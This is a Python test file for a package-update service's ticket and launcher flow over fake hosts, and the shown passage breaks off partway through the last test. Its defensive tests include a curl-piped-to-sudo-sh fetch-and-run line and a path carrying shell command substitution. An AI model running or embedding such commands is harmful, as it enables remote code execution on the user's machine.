"""Selected synthetic work copies only. No host inventory, update or repair: every package manager, boot time and started
child is a fake. The real children are this interpreter: killed mid-run in test_service_kill.py, and at the end of
ChildTests, in a pseudo-terminal, interrupted the way a person's Ctrl-C does.
The real routes run here too, over FakeHost, so that a defect in one parser fails that parser's tests in test_packages and these flows
fail here, and test_packages stays a precise report of which token, parser or rule broke.

Update and repair family (scripts/service_updates.py): discovery, package actions in their plan order, the one-use
ticket and the ticket-bound launcher, receipts, the check after a restart and reconciliation.
The helpers below (FakeChild, FakeTerminal, RunProbe, fake_route, fake_payload, Harness) are shared by every class;
each test builds its own state through them and depends on no other test.
"""
from __future__ import annotations
import ast
import contextlib
from contextlib import nullcontext
from datetime import datetime, timedelta, timezone
import io
import json
import os
from pathlib import Path, PureWindowsPath
import select
import shlex
import signal
import sys
import threading
import time
from types import MappingProxyType, SimpleNamespace
import unittest
from unittest import mock
import uuid

sys.dont_write_bytecode = True
ROOT = Path(__file__).absolute().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))
import engine_text
import engine_updates
import package_apt as apt
import package_registry
import package_routes as routes
import patchcairn_service
import pc_records
import readonly_runner
import service_state
import service_updates
from clock_helpers import utc_now
from private_workspace import ensure_private_directory, write_private_new
from workflow_core import WorkflowRefusal, digest, encoded
from workflow_service import WorkflowService, ServiceRefusal
from test_packages import (fixture_root, holds, refusals_fail, remove_fixture_roots, FakeChild, FakeLauncher, FakeProbe, FakeTerminal, ManagerRun, PackageEngineFixture,
                           RunProbe, fake_payload, fake_route, fixture, regular, registered, sudo_identity, APP_FOLDER, BREW, FAKE_ENV, FIRMWARE, HANDOFF, ORIGIN,
                           REINSTALL, REPAIR, RUN_FOLDER, SETTLED_APT, SUDO, UPGRADE, WINGET, WINGET_OUTPUT)
from test_service_state import PROSE

SESSION, OPERATION, ACTION, PLAN = "session-package", "operation-package", "action-package", "a" * 64


APT_FOLDERS = {"/etc/apt": ["sources.list.d"], "/etc/apt/sources.list.d": []}


class FakeHost:
    """A fictional computer for the real apt and dnf routes, so that the route, the service and the engine run as they do. offers
    maps each package to (installed version or None, offered version); brings maps a package to what its update also changes. As
    the read-only launcher (read) it answers the argv the recipes render from what stands now; as the run launcher (child) it
    installs what the argv names and all that brings. Nothing on this computer is read or started."""

    def __init__(self, manager, offers, brings=None, repos=None):
        self.manager, self.offers, self.brings, self.repos, self.started = manager, dict(offers), dict(brings or {}), dict(repos or {}), []
        self.installed = {name: pair[0] for name, pair in offers.items() if pair[0]}

    def pending(self):
        return {name: pair[1] for name, pair in self.offers.items() if self.installed.get(name) != pair[1]}

    def transaction(self, name):
        """The packages an update of ``name`` changes now, the item first."""
        found = [name]
        for item in found:
            found += [other for other in self.brings.get(item, ()) if other not in found and other in self.pending()]
        return found

    def probe(self, **keywords):
        return RunProbe(folders=APT_FOLDERS, **keywords)

    def read(self, argv, *, env, cwd, timeout, max_bytes):
        return 0, (self._apt(argv) if self.manager == "apt" else self._dnf(argv))

    def child(self, argv, **keywords):
        self.started.append(argv)
        for token in argv[1:]:
            match = routes.F_NEVRA.fullmatch(token)
            name = match[1] if match else token.split("=")[0]
            if name in self.offers:
                for other in self.transaction(name):
                    self.installed[other] = self.offers[other][1]
        return 0, b""

    def _inst(self, name):
        old, target = self.offers[name][0], self.offers[name][1]
        return f"Inst {name} {f'[{old}] ' if self.installed.get(name) else ''}({target} {ORIGIN} [amd64])\nConf {name} ({target} {ORIGIN} [amd64])\n"

    def _apt(self, argv):
        if argv[0].endswith("dpkg-query"):
            return "".join(f"{name}\tamd64\t{version}\tii \n" for name, version in sorted(self.installed.items())).encode()
        if argv[0].endswith("apt-config"):
            return fixture("apt-config.txt")
        if argv[0].endswith("apt-cache"):
            return f"{argv[2]}:\n  Installed: x\n  Candidate: {self.pending()[argv[2]]}\n  Version table:\n".encode()
        if argv[1:3] == ("-s", "-q"):
            return "".join(self._inst(name) for name in sorted(self.pending()) if self.installed.get(name)).encode()
        if argv[0].endswith("apt-get"):
            return "".join(self._inst(name) for name in self.transaction(argv[-1].split("=")[0])).encode()
        return b""  # dpkg --compare-versions (exit 0: newer), needrestart

    def _repo(self, name):
        return self.repos.get(name, "updates")

    def _dnf(self, argv):
        if argv[0].endswith("rpm"):
            return "".join(f"{name} 0:{version}.x86_64\n" for name, version in sorted(self.installed.items())).encode()
        if "repoquery" in argv:
            return "".join(f"{name}-0:{target}.x86_64 {self._repo(name)}\n" for name, target in sorted(self.pending().items()) if self.installed.get(name)).encode()
        if argv[1] == "--version":
            return fixture("dnf-version.txt")
        if argv[1].startswith("--dump-repo-config="):
            return b"[example]\npkg_gpgcheck = " + (b"0" if argv[1].endswith("=unsigned") else b"1") + b"\n"
        if argv[1:3] == ("upgrade", "--assumeno"):
            names = self.transaction(routes.F_NEVRA.fullmatch(argv[-1])[1])
            rows = {"Upgrading": [name for name in names if self.installed.get(name)], "Installing dependencies": [name for name in names if not self.installed.get(name)]}
            table = "".join(f"{section}:\n" + "".join(f" {name} x86_64 {self.offers[name][1]} {self._repo(name)} 1 KiB\n" for name in listed)
                            for section, listed in rows.items() if listed)
            return f"Package Arch Version Repository Size\n{table}\nTransaction Summary:\n".encode()
        return b""  # dnf5 needs-restarting


class Harness:
    """A fictional service around one begun package operation: the real ticket, lock, run folder, re-checks, launcher
    path and effect boundary over a fake engine (a SimpleNamespace), the shared service steps patched only where they need the
    real engine. ``finished`` collects every outcome and receipt; ``state`` is the fake engine's session."""

    def __init__(self, route, payload, *, adapter_id=UPGRADE, run_files=None, status="active", root=None, saved=None):
        self.root = root or fixture_root()
        ensure_private_directory(self.root / "work" / "services", create=True, parents=True, exist_ok=True)
        ensure_private_directory(self.root / "engine" / SESSION, create=True, parents=True, exist_ok=True)
        self.route, self.payload, self.adapter_id, self.finished, self.registered, self.events = route, payload, adapter_id, [], [], []
        service = self.service = object.__new__(WorkflowService)
        service.root, service.work = self.root, self.root / "work" / "services"
        service.elevation_probe = lambda: False
        if saved is None:
            folder = service._run_folder()
            for name, text in (run_files or {}).items():
                write_private_new(folder / name, text.encode("utf-8"))
            inventory = encoded({"manager": payload["manager"], "id": payload["id"], "run_folder": folder.name, "run_files": run_files or {}})
            write_private_new(self.root / "engine" / SESSION / "inventory.json", inventory)
            saved = {"folder": str(folder), "inventory_sha256": digest(inventory), "started_utc": utc_now(), "status": status}
            (self.root / "harness.json").write_text(json.dumps(saved), encoding="utf-8")
        self.folder = Path(saved["folder"])
        self.action = {"action_id": ACTION, "adapter_id": adapter_id, "adapter_payload_sha256": digest(payload), "requires_recovery": False,
                       "requires_os_consent": service_updates._needs_os_consent(adapter_id, route),
                       "target_inventory_evidence_id": "inventory-1", "target_inventory_sha256": saved["inventory_sha256"]}
        if payload["run_kind"] != "settings":
            self.action["rendered_command"] = service_updates._shown_command(route, payload, self.folder)
        self.operation = {"operation_id": OPERATION, "action_id": ACTION, "plan_sha256": PLAN, "outcome": None, "started_utc": saved["started_utc"]}
        self.state = {"session_id": SESSION, "mode": "fixture", "platform": "linux", "status": saved["status"], "stage": "apply",
                      "operations": {}, "settings": {"scope": {"roots": [], "purpose": "Fictional"}},
                      "evidence": {"inventory-1": {"path": "inventory.json", "sha256": saved["inventory_sha256"]}}}
        self.intent = {"operation": self.operation, "action": self.action, "payload": payload}
        service.engine = SimpleNamespace(work=self.root / "engine", read_session=self.read_session, current_plan=self.current_plan,
                                         action_binding=lambda state, action, operation_id=None: payload, register_evidence=mock.Mock(side_effect=self.register),
                                         record_restart_pending=mock.Mock(side_effect=self.restart_pending),
                                         record_boot_observation=mock.Mock(return_value={"data": {"boot_observed": True}}),
                                         admit_effect=mock.Mock(side_effect=self.admit))
        service.inspect_operation = mock.Mock(side_effect=lambda session_id, *, operation_id: {"operation": self.operation, "intent": self.intent})
        service._original_authority = mock.Mock()
        service._begin_adapter = mock.Mock(side_effect=self.begin)
        service._finish = mock.Mock(side_effect=self.finish)

    @classmethod
    def load(cls, root, route, payload, adapter_id):
        """The harness of a root another process prepared (the process-kill child)."""
        harness = cls(route, payload, adapter_id=adapter_id, root=Path(root), saved=json.loads((Path(root) / "harness.json").read_text(encoding="utf-8")))
        harness.state["operations"][OPERATION] = harness.operation
        return harness

    def read_session(self, session_id):
        self.events.append("read_session")
        return self.state

    def current_plan(self, state, plan_sha256):
        if plan_sha256 != PLAN:
            raise ServiceRefusal("Not the current plan")
        return {"actions": [self.action]}

    def register(self, session_id, *, evidence_id, content, kind, scope, facts, observed_utc):
        self.registered.append({"evidence_id": evidence_id, "content": content, "kind": kind, "facts": facts})
        return {"data": {"evidence_id": evidence_id, "sha256": digest(content)}}

    def begin(self, session_id, state, action, payload, **keywords):
        self.events.append("begin")
        self.state["operations"][OPERATION] = self.operation
        return self.operation, self.service._operation_dir(SESSION, OPERATION, create=True), self.intent, None

    def finish(self, state, operation, *, outcome, receipt, kind="outcome"):
        self.events.append("finish")
        operation["outcome"] = outcome
        self.finished.append({"outcome": outcome, "receipt": receipt, "kind": kind})
        return {"operation_id": operation["operation_id"], "outcome": outcome, "receipt": receipt}

    def restart_pending(self, session_id, *, operation_id, evidence_id):
        row = next(item for item in self.registered if item["evidence_id"] == evidence_id)
        self.operation["restart_pending"] = {"signal": row["facts"]["restart_signal"], "source": row["facts"]["restart_source"]}
        return {"data": self.operation["restart_pending"]}

    def admit(self, session_id, *, operation_id):
        """Stands in for the engine's admission: a session that is no longer active admits no effect."""
        self.events.append("admit")
        if self.state["status"] != "active":
            raise WorkflowRefusal("This session is paused or stopped, so this step does not start", code="effect-paused")

    def issue(self, *, register=True):
        """Step 1: the execute target writes the one-use ticket; returns its {"operation_id", "ticket_id", "command"}."""
        target = getattr(self.service, "_execute_" + self.adapter_id.replace(".", "_"))
        with registered(self.route) if register else nullcontext():
            return target(SESSION, self.state, self.action, self.payload, action_id=ACTION, plan_sha256=PLAN, precondition_evidence_ids=["proof"],
                          owner_consent_evidence_id=None, diagnostic_fixture_runner=None, diagnostic_fixture_result=None)

    def run(self, ticket_id, *, child=None, probe=None, terminal=None, reader=None, routes=()):
        with registered(self.route, *routes):
            return self.service.run_ticket(ticket_id=ticket_id, launcher=child or FakeChild(), probe=probe or RunProbe(),
                                           reader=reader or FakeLauncher(), terminal=terminal or FakeTerminal())

    def interrupted(self, ticket_id, *, child=None, probe=None, reader=None):
        """A real run whose parent stops right after it recorded the child's exit, before anything else is read."""
        with mock.patch.object(self.service, "_complete", side_effect=KeyboardInterrupt):
            try:
                self.run(ticket_id, child=child, probe=probe, reader=reader)
            except KeyboardInterrupt:
                return
        raise AssertionError("the run was not interrupted")

    def reconcile(self, stdout=b"", probe=RunProbe):
        """reconcile_operation through the service: every read-only read a fake that prints ``stdout``, and the computer a fake from
        ``probe``, both given to it as a practice session's fakes."""
        with registered(self.route), mock.patch.object(readonly_runner, "run_recipe", return_value={"ok": True, "stdout": stdout, "exit_code": 0}):
            return self.service.reconcile_operation(SESSION, operation_id=OPERATION, probe=probe(), reader=FakeLauncher(stdout))

    def entered(self):
        return (self.service._operation_dir(SESSION, OPERATION) / "entered.json").exists()

    def exit_recorded(self):
        return (self.service._operation_dir(SESSION, OPERATION) / service_updates.EXIT_RECORD).exists()

    def ticket(self, ticket_id):
        return {"ticket_id": ticket_id, "operation_id": OPERATION, "run_folder": str(self.folder), "run_files": self.payload.get("run_files", {})}


def harness(route=None, **keywords):
    route = route or fake_route()
    adapter_id = keywords.pop("adapter_id", UPGRADE)
    run_files = keywords.pop("run_files", None)
    payload = fake_payload(route, adapter_id=adapter_id, run_files=run_files, **keywords)
    return Harness(route, payload, adapter_id=adapter_id, run_files=run_files)


@refusals_fail
class LauncherTests(unittest.TestCase):
    def test_bound_run_file_rehashed_before_start(self):
        events = []
        made = harness(fake_route(events), run_files={"requirements.txt": "example-tool==1.0.0\n"})
        ticket = made.issue()["ticket_id"]
        original = service_updates.UpdatesMixin._run_files
        def rehash(folder, payload):
            events.append("rehash")
            return original(folder, payload)
        child = FakeChild(events=events)
        with mock.patch.object(service_updates.UpdatesMixin, "_run_files", staticmethod(rehash)):
            made.run(ticket, child=child)
        self.assertIn("rehash", events)
        self.assertLess(events.index("rehash"), events.index("start"))
        self.assertEqual(len(child.calls), 1)

    def test_changed_run_file_holds(self):
        for change in ("changed", "extra", "removed"):
            with self.subTest(change=change):
                made = harness(run_files={"requirements.txt": "example-tool==1.0.0\n"})
                ticket = made.issue()["ticket_id"]
                if change == "changed":
                    (made.folder / "requirements.txt").write_bytes(b"other-tool==9.9\n")
                elif change == "extra":
                    write_private_new(made.folder / "extra.txt", b"unbound")
                else:
                    (made.folder / "requirements.txt").unlink()
                child = FakeChild()
                with self.assertRaises(ServiceRefusal) as caught:
                    made.run(ticket, child=child)
                self.assertEqual(caught.exception.code, "package-run-file-changed")
                self.assertEqual(child.calls, [])
                self.assertFalse(made.entered())

    def test_terminal_action_refuses_without_tty(self):
        events = []
        made = harness(fake_route(events))
        ticket = made.issue()["ticket_id"]
        child = FakeChild()
        held = made.run(ticket, child=child, terminal=FakeTerminal(tty=False))
        self.assertEqual(held.get("hold"), "package-terminal-needed")
        self.assertEqual((child.calls, made.finished, made.entered()), ([], [], False))
        self.assertNotIn("drift", events)
        # The ticket stays usable: in a terminal the same ticket runs once.
        made.run(ticket, child=child, terminal=FakeTerminal(tty=True))
        self.assertEqual((len(child.calls), made.finished[0]["outcome"]), (1, "succeeded"))
        self.assertIs(child.calls[0].terminal, True)

    def test_firmware_terminal_confirmation_must_name_the_device(self):
        events = []
        route = fake_route(events, manager="fwupd")
        device = {"id": "1a8d0d9a96ad3e67ba76cf3033623625dc6d6882", "number": 3, "target_version": "1.2.3"}
        made = harness(route, adapter_id=FIRMWARE, device=device, flags=("firmware", "high_risk"))
        reads = service_updates._Reads(made.folder, RunProbe(), FakeLauncher())
        for answer in ("4", "", None, "3 4", "device 3"):
            with self.subTest(answer=answer), registered(route):
                events.clear()
                with self.assertRaises(ServiceRefusal) as caught:
                    made.service._launch_plan(made.state, made.action, made.payload, route, reads, made.ticket("ticket-firmware"), RunProbe(),
                                              FakeTerminal(answer=answer, events=events))
                self.assertEqual(caught.exception.code, "package-device-number")
                self.assertEqual(events, ["ask"])
        with registered(route):
            events.clear()
            launch = made.service._launch_plan(made.state, made.action, made.payload, route, reads, made.ticket("ticket-firmware"), RunProbe(),
                                               FakeTerminal(answer=" 3\n", events=events))
        self.assertEqual(launch["device_number"], "matched")
        self.assertEqual(events, ["ask", "drift"])
        # Without a terminal nothing is asked and nothing starts.
        with registered(route):
            held = made.service._launch_plan(made.state, made.action, made.payload, route, reads, made.ticket("ticket-firmware"), RunProbe(),
                                             FakeTerminal(tty=False, answer="3"))
        self.assertEqual(held.get("hold"), "package-terminal-needed")

    def test_executable_rechecked_through_runner_before_start(self):
        events = []
        made = harness(fake_route(events))
        ticket = made.issue()["ticket_id"]
        original = readonly_runner.recheck_executable
        calls = []
        def recheck(*args, **keywords):
            calls.append((args, keywords))
            events.append("recheck")
            return original(*args, **keywords)
        child = FakeChild(events=events)
        with mock.patch.object(readonly_runner, "recheck_executable", side_effect=recheck):
            made.run(ticket, child=child)
        self.assertTrue(calls, "the executable was not checked again")
        self.assertEqual(calls[0][0][:3], ("system", SUDO, sudo_identity()))
        self.assertEqual(calls[0][1]["program"], SUDO)
        self.assertLess(events.index("recheck"), events.index("start"))
        # A sudo that is no longer root-owned holds before anything starts.
        made = harness()
        ticket = made.issue()["ticket_id"]
        child = FakeChild()
        with self.assertRaises(ServiceRefusal) as caught:
            made.run(ticket, child=child, probe=RunProbe(files={SUDO: regular(uid=1000)}))
        self.assertEqual((caught.exception.code, child.calls), ("runner-executable", []))

    def test_winget_recheck_needs_family_and_target_not_the_tag_alone(self):
        # The winget alias is re-checked through readonly_runner: the right reparse tag with another package family or another
        # target holds (the WindowsApps folder of App Installer's own winget.exe).
        route = {**package_registry.WINGET, "drift": lambda probe, run, payload: None}
        identity = readonly_runner.executable_identity("winget", WINGET, probe=RunProbe(platform="win32"))
        self.assertEqual(identity, {"package": APP_FOLDER})
        fields = {"manager": "winget", "operation": "upgrade", "id": "Contoso.NoteTaker", "version": "3.4.1", "source": "winget", "group": "apps",
                  "flags": [], "preflight": {"fictional": True}, "dependencies": [], "agreements": [], "run_kind": "process", "recipe": "winget.upgrade",
                  "run_files": {}, "executable": {"kind": "winget", "path": WINGET, "identity": identity}}
        environment = package_registry.WINGET["run"]["environment"](RunProbe(platform="win32"))
        # The run folder of this fixture is a POSIX path on Linux and macOS, where winget's log file has no shown command.
        with mock.patch.object(service_updates, "_shown_command", return_value="shown"):
            made = Harness(route, package_registry.payload(fields, environment=environment))
            ticket = made.issue()["ticket_id"]
        other_family = ["Contoso.Fake_abc", "Contoso.Fake_abc!winget", FakeProbe.LINK[2]]
        other_target = [FakeProbe.LINK[0], FakeProbe.LINK[1], "D:\\Elsewhere\\" + APP_FOLDER + "\\winget.exe"]
        for link in (other_family, other_target):
            with self.subTest(link=link):
                child = FakeChild()
                with self.assertRaises(ServiceRefusal):
                    made.run(ticket, child=child, probe=RunProbe(platform="win32", link=link), routes=(route,))
                self.assertEqual(child.calls, [])
        self.assertEqual(readonly_runner.recheck_executable("winget", WINGET, identity, probe=RunProbe(platform="win32")), identity)
        with self.assertRaises(pc_records.Refusal):
            readonly_runner.recheck_executable("winget", WINGET, None, probe=RunProbe(platform="win32"))

    def test_fake_descriptor_needs_no_service_change(self):
        # A route for a manager the core registry does not build plugs in through the registry alone: prepare, the ticket,
        # the launcher, the receipt and verification all reach it through its descriptor, and the service names no manager.
        events = []
        route = fake_route(events, manager="npm")
        made = harness(route)
        issued = made.issue()
        made.run(issued["ticket_id"], child=FakeChild(events=events))
        self.assertEqual(made.finished[0]["receipt"]["manager"], "npm")
        self.assertEqual(made.finished[0]["receipt"]["result"], "updated")
        self.assertEqual(events.count("drift"), 1)
        tree = ast.parse((ROOT / "scripts" / "service_updates.py").read_text(encoding="utf-8"))
        names = set(package_registry.MANAGERS)
        compared = [node.lineno for node in ast.walk(tree) if isinstance(node, ast.Compare)
                    for value in ast.walk(node) if isinstance(value, ast.Constant) and value.value in names]
        self.assertEqual(compared, [], "service_updates compares against a manager name")

    def test_terminal_child_inherits_console_handles(self):
        started = []
        class Popen:
            def __init__(self, argv, **keywords):
                started.append((argv, keywords))
                self.stdout = None
            def wait(self, timeout=None):
                return 0
        with mock.patch.object(service_updates.subprocess, "Popen", Popen):
            self.assertEqual(service_updates._start_child(("/usr/bin/sudo", "x"), env=dict(FAKE_ENV), cwd="/", terminal=True), (0, b""))
        argv, keywords = started[0]
        self.assertEqual(argv, ["/usr/bin/sudo", "x"])
        self.assertEqual(keywords["shell"], False)
        for handle in ("stdin", "stdout", "stderr"):
            self.assertIsNone(keywords.get(handle), handle + " must be inherited, never a pipe")
        # The default launcher is used, with the terminal flag, for a terminal item run through its ticket of a real session.
        made = harness()
        made.state.update(mode="real", platform=service_state.native_platform())
        ticket = made.issue()["ticket_id"]
        with mock.patch.object(service_updates, "_start_child", wraps=lambda argv, **keywords: (0, b"")) as child, registered(made.route):
            made.service.run_ticket(ticket_id=ticket, probe=RunProbe(), reader=FakeLauncher(), terminal=FakeTerminal())
        self.assertIs(child.call_args.kwargs["terminal"], True)

    def test_drift_hook_runs_right_before_start_and_before_opening_settings(self):
        events = []
        made = harness(fake_route(events))
        ticket = made.issue()["ticket_id"]
        original, recheck, rehash = package_registry.argv, readonly_runner.recheck_executable, service_updates.UpdatesMixin._run_files
        def step(name, function):
            return lambda *args, **keywords: (events.append(name), function(*args, **keywords))[1]
        with mock.patch.object(package_registry, "argv", side_effect=step("argv", original)), \
                mock.patch.object(readonly_runner, "recheck_executable", side_effect=step("recheck", recheck)), \
                mock.patch.object(service_updates.UpdatesMixin, "_run_files", staticmethod(step("rehash", rehash))):
            made.run(ticket, child=FakeChild(events=events))
        self.assertEqual(events[:6], ["rehash", "recheck", "drift", "argv", "start", "verify"])
        self.assertEqual(events.count("drift"), 1)
        # A drift holds: nothing starts and no effect boundary is written.
        made = harness(fake_route(drift={"hold": "package-drift", "message": "Changed since the plan"}))
        ticket = made.issue()["ticket_id"]
        child = FakeChild()
        with self.assertRaises(ServiceRefusal) as caught:
            made.run(ticket, child=child)
        self.assertEqual((caught.exception.code, child.calls, made.entered()), ("package-drift", [], False))
        # A Settings item: drift() first, then its fixed page (a typed hold until the Settings route is written).
        events = []
        route = fake_route(events, run_kind="settings")
        made = harness(route, adapter_id=HANDOFF, run_kind="settings", settings_page="windowsupdate-optionalupdates")
        reads = service_updates._Reads(made.folder, RunProbe(), FakeLauncher())
        opened = mock.Mock(side_effect=lambda page: (events.append("open:" + page), {"hold": "package-settings-not-built"})[1])
        with mock.patch.object(made.service, "_open_settings", opened):
            held = made.service._launch_plan(made.state, made.action, made.payload, route, reads, made.ticket("t"), RunProbe(), FakeTerminal())
        self.assertEqual(events, ["drift", "open:windowsupdate-optionalupdates"])
        self.assertEqual(held["hold"], "package-settings-not-built")
        # A firmware item: the device number first, then drift() as the last check before the argv.
        events = []
        route = fake_route(events, manager="fwupd")
        made = harness(route, adapter_id=FIRMWARE, device={"id": "f" * 40, "number": 1, "target_version": "2.0"}, flags=("firmware", "high_risk"))
        reads = service_updates._Reads(made.folder, RunProbe(), FakeLauncher())
        with registered(route), mock.patch.object(package_registry, "argv", side_effect=lambda *a, **k: (events.append("argv"), original(*a, **k))[1]):
            made.service._launch_plan(made.state, made.action, made.payload, route, reads, made.ticket("t"), RunProbe(),
                                      FakeTerminal(answer="1", events=events))
        self.assertEqual(events, ["ask", "drift", "argv"])

    def test_only_a_package_ticket_runs(self):
        made = harness()
        ticket = made.issue()["ticket_id"]
        child = FakeChild()
        for name in ("ticket-" + "0" * 32, "../" + ticket, ""):
            with self.subTest(ticket=name), self.assertRaises((ServiceRefusal, OSError, pc_records.Refusal)):
                made.run(name, child=child)
        tickets = made.service.work / "tickets"
        record = json.loads((tickets / (ticket + ".json")).read_text(encoding="utf-8"))
        for change in ({"kind": "operation_intent"}, {"ticket_id": "ticket-" + "1" * 32}, {"run_folder": str(made.root / "work" / "elsewhere")}):
            with self.subTest(change=sorted(change)):
                forged = "ticket-" + uuid.uuid4().hex
                write_private_new(tickets / (forged + ".json"), encoded({**record, "ticket_id": forged, **change}))
                with self.assertRaises(ServiceRefusal):
                    made.run(forged, child=child)
        self.assertEqual((child.calls, made.entered()), ([], False))
        made.run(ticket, child=child)
        self.assertEqual(len(child.calls), 1)

    def test_unknown_manager_holds(self):
        route = fake_route(manager="softwareupdate")
        made = harness(route)
        with self.assertRaises(ServiceRefusal) as caught:
            made.issue(register=False)
        self.assertEqual(caught.exception.code, "package-manager-unknown")
        made.service._begin_adapter.assert_not_called()
        ticket = made.issue()["ticket_id"]
        child = FakeChild()
        with self.assertRaises(ServiceRefusal) as caught:
            made.service.run_ticket(ticket_id=ticket, launcher=child, probe=RunProbe(), reader=FakeLauncher(), terminal=FakeTerminal())
        self.assertEqual((caught.exception.code, child.calls), ("package-manager-unknown", []))
        self.assertEqual(package_registry.DESCRIPTORS.get("softwareupdate"), None)
        with self.assertRaises(pc_records.Refusal):
            package_registry.descriptor("Winget")

    def test_executable_prefix_comes_from_the_runner(self):
        made = harness()
        ticket = made.issue()["ticket_id"]
        child = FakeChild()
        with mock.patch.object(readonly_runner, "executable_prefix", return_value=("prefix-from-runner",)) as prefix:
            made.run(ticket, child=child)
        prefix.assert_called_with("system")
        self.assertEqual(child.calls[0].argv[:2], (SUDO, "prefix-from-runner"))
        self.assertEqual(child.calls[0].argv[2:], package_registry.argv("apt.configure", {}, executable=SUDO)[1:])

    def test_no_terminal_hold_shows_the_launcher_command_only(self):
        made = harness()
        ticket = made.issue()["ticket_id"]
        held = made.run(ticket, terminal=FakeTerminal(tty=False))
        script = str(ROOT / "scripts" / "patchcairn_service.py")
        self.assertEqual(held.get("command"), package_registry.shell_line((sys.executable, "-I", "-S", "-B", script, "run", "--ticket", ticket)))
        recipe = set(package_registry.argv("apt.configure", {}, executable=SUDO))
        self.assertFalse(recipe & set(held["command"].replace("'", " ").split()))

    def test_launcher_command_quotes_every_argument_for_its_shell(self):
        # The checkout path may hold shell syntax. Pasted into the person's own terminal, it stays one literal argument.
        ticket, script = "ticket-" + "0" * 32, str(ROOT / "scripts" / "patchcairn_service.py")
        hostile = "/srv/a b/$(touch x)/`id`;'q/python3"
        with mock.patch.object(service_updates.sys, "executable", hostile):
            line = service_updates.launcher_command(ticket)
        # Literally single-quoted: double quotes would split back the same here and still let a shell run the substitution.
        self.assertTrue(line.startswith("'/srv/a b/$(touch x)/`id`;'\"'\"'q/python3' -I -S -B "), line)
        self.assertEqual(shlex.split(line), [hostile, "-I", "-S", "-B", script, "run", "--ticket", ticket])
        windows = "C:\\Py $(x) `y\\it's\u2019\\python.exe"
        with mock.patch.object(service_updates.sys, "executable", windows):
            line = service_updates.launcher_command(ticket)
        self.assertEqual(line, "& 'C:\\Py $(x) `y\\it''s\u2019\u2019\\python.exe' -I -S -B '" + script.replace("'", "''") + "' run --ticket " + ticket)
        # A path no line can carry refuses at the ticket step, before begin consumes the action.
        made = harness()
        with mock.patch.object(service_updates.sys, "executable", "/srv/new\nline/python3"), self.assertRaises(pc_records.Refusal) as caught:
            made.issue()
        self.assertEqual(caught.exception.code, "package-shown-command")
        made.service._begin_adapter.assert_not_called()

    def test_admission_is_the_last_step_before_the_start(self):
        events = []
        made = harness(fake_route(events))
        made.events = events
        ticket = made.issue()["ticket_id"]
        original = package_registry.argv
        with mock.patch.object(package_registry, "argv", side_effect=lambda *a, **k: (events.append("argv"), original(*a, **k))[1]):
            made.run(ticket, child=FakeChild(events=events))
        # One admission covers the ticket path, as the last step, so nothing can arrive between two of them.
        self.assertEqual([event for event in events if event in ("drift", "argv", "admit", "start")], ["drift", "argv", "admit", "start"])
        # A pause or stop that arrives during the checks: the session read at the start was active, the admission refuses.
        for status in ("pause_pending", "paused", "stopped"):
            with self.subTest(status=status):
                made = harness()
                ticket = made.issue()["ticket_id"]
                made.route = MappingProxyType({**made.route, "drift": lambda probe, run, payload, made=made, status=status: made.state.update(status=status)})
                child = FakeChild()
                made.run(ticket, child=child)
                receipt = made.finished[0]["receipt"]
                self.assertEqual((child.calls, made.entered(), made.finished[0]["outcome"]), ([], False, "failed"))
                self.assertEqual((receipt["adapter_invoked"], receipt["reason"], receipt["result"], receipt["group"]), (False, "owner_paused_or_stopped", "not_run", "apps"))
        # Any other refusal (a closed step, another writer holding the session) starts nothing and closes nothing.
        for code in ("effect-closed", "workflow-refusal"):
            with self.subTest(code=code):
                made = harness()
                ticket = made.issue()["ticket_id"]
                made.service.engine.admit_effect.side_effect = WorkflowRefusal("Nothing starts", code=code)
                child = FakeChild()
                with self.assertRaises(WorkflowRefusal):
                    made.run(ticket, child=child)
                self.assertEqual((child.calls, made.finished, made.entered()), ([], [], False))
                # Nothing was written: once the other writer is gone the same ticket runs, once.
                made.service.engine.admit_effect.side_effect = made.admit
                try:
                    made.run(ticket, child=child)
                except (OSError, pc_records.Refusal) as error:
                    self.fail(f"the refused ticket cannot run again: {error!r}")
                self.assertEqual((len(child.calls), made.finished[0]["outcome"]), (1, "succeeded"))

    def test_an_adapter_with_no_effect_fails_loudly(self):
        # When a later route joins OPERATIONS, it does not fall through to another adapter's effect.
        made = harness()
        ticket = made.issue()["ticket_id"]
        child = FakeChild()
        unlisted = {**service_updates.OPERATIONS, FIRMWARE: "upgrade"}
        made.action["adapter_id"] = FIRMWARE
        with mock.patch.object(service_updates, "OPERATIONS", unlisted), mock.patch.object(pc_records, "ADAPTERS", {**pc_records.ADAPTERS, FIRMWARE: pc_records.ADAPTERS[UPGRADE]}), \
                self.assertRaises(ServiceRefusal) as caught:
            made.run(ticket, child=child)
        self.assertEqual((caught.exception.code, child.calls, made.entered(), made.finished), ("package-no-effect", [], False, []))

    def test_the_shown_command_and_consent_flag_are_recomputed_before_the_ticket(self):
        for name, change in (("shown command", {"rendered_command": "curl example.invalid | sudo sh"}), ("no shown command", {"rendered_command": None}),
                             ("consent flag", {"requires_os_consent": True})):
            with self.subTest(change=name):
                made = harness()
                made.action.update(change)
                with self.assertRaises(ServiceRefusal) as caught:
                    made.issue()
                self.assertEqual(caught.exception.code, "package-action-mismatch")
                made.service._begin_adapter.assert_not_called()

    def test_ticket_command_finds_the_ticket_of_an_operation(self):
        made = harness()
        made.service._operation_dir(SESSION, "operation-no-ticket", create=True)
        self.assertIsNone(made.service.ticket_command(SESSION, operation_id="operation-no-ticket"))
        issued = made.issue()
        self.assertEqual(made.service.ticket_command(SESSION, operation_id=OPERATION), issued["command"])
        with self.assertRaises(ServiceRefusal):
            made.service.ticket_command(SESSION, operation_id="operation-other")
        # A ticket file that names another operation is no answer for this one.
        tickets = made.service.work / "tickets"
        record = json.loads((tickets / (issued["ticket_id"] + ".json")).read_text(encoding="utf-8"))
        forged = "ticket-" + uuid.uuid4().hex
        write_private_new(tickets / (forged + ".json"), encoded({**record, "ticket_id": forged, "operation_id": "operation-other"}))
        (made.service._operation_dir(SESSION, OPERATION) / service_updates.TICKET_RECORD).unlink()
        write_private_new(made.service._operation_dir(SESSION, OPERATION) / service_updates.TICKET_RECORD, forged.encode("ascii"))
        with self.assertRaises(ServiceRefusal):
            made.service.ticket_command(SESSION, operation_id=OPERATION)

    def test_a_practice_session_refuses_the_real_launcher(self):
        # Every fake the ticket can use must be given: without one, the real child, probe or read-only launcher would run.
        made = harness()
        ticket = made.issue()["ticket_id"]
        for missing in ("launcher", "probe", "reader"):
            fakes = {key: value for key, value in (("launcher", FakeChild()), ("probe", RunProbe()), ("reader", FakeLauncher())) if key != missing}
